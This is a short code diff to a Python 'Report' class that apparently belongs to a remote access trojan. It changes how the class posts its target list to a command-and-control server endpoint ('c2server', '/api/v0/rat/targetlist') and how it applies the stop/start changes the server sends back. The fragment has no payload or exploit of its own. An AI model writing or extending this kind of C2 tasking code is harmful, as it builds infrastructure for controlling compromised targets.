@@ -22,26 +22,19 @@ class Report:
         print(res.text)
         self.task_manager = TaskManager()
 
- 
-
-
     def _update_target_list(self):
         """ Send report of target list and update task manager based on returned data """
         print("updating: ", self.task_manager.target_list.get_targets())
         response = self.s.post(
             self.c2server+"/api/v0/rat/targetlist",
             json={
-                "targets": self.task_manager.target_list.get_targets()
+                "target_list": self.task_manager.target_list.export_json()
                 }
         )
 
-        if response.status_code != 200:
-            print(f"ERROR: Error occured while updating remote target list: {response.text}")
-
-        data = response.json()
-        self.task_manager.update_blacklist_from_c2(data['blacklist'])
-
-
+        changes = response.json().get("changes")
+        for change in changes:
+            self.task_manager.target_list.set_stopped_state(change['target'], change['stopped'])
 
 
     def run(self):
